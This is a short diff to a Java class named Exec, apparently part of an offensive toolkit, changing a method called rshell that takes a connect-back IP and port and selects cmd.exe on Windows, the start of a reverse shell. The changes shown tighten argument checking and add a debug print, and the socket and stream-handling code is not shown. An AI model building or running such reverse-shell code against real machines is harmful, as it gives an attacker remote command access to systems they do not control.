@@ -4,11 +4,12 @@ import java.util.Arrays;
 
 public class Exec {
 	public static void rshell(String[] args) {
-		if(args.length == 0 || args[0] == "help"){
+		if(args.length < 2 || args[0] == "help"){
 			System.out.println("Usage: rshell <connect ip> <port>");
 		}else{
 			String host = args[0];
 			int port = Integer.parseInt(args[1]);
+			System.out.println(host + port);
 			String cmd = "";
 			if(System.getProperty("os.name").toLowerCase().indexOf("win") != -1){
 				cmd = "cmd.exe";
@@ -42,7 +43,7 @@ public class Exec {
 				e.printStackTrace();
 			}
 		}
-
+		
 
 	}
 	public static void exec(String[] cmd) {
